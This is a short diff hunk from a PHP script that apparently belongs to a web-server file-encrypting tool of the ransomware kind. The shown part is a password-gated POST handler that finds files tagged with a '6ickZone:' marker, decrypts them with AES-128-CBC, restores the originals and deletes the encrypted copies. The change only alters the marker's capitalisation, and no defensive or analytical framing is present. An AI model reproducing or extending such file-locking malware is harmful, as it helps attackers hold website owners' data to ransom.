@@ -53,7 +53,7 @@ if(isset($_POST["key"]) && $_POST["key"] === $pass){
     foreach ($ite as $f) {
         if ($f->isFile() && substr($f->getFilename(), -strlen($ext)) === $ext) {
             $p = $f->getRealPath(); $d = @file_get_contents($p);
-            if(substr($d,0,9)==="6ickZone:"){
+            if(substr($d,0,9)==="6ickzone:"){
                 $c = base64_decode(substr($d,9)); $iv = substr($c,0,16); $en = substr($c,16);
                 $dc = openssl_decrypt($en,"AES-128-CBC",$pass,OPENSSL_RAW_DATA,$iv);
                 if($dc){ file_put_contents(substr($p,0,-strlen($ext)),$dc); unlink($p); }
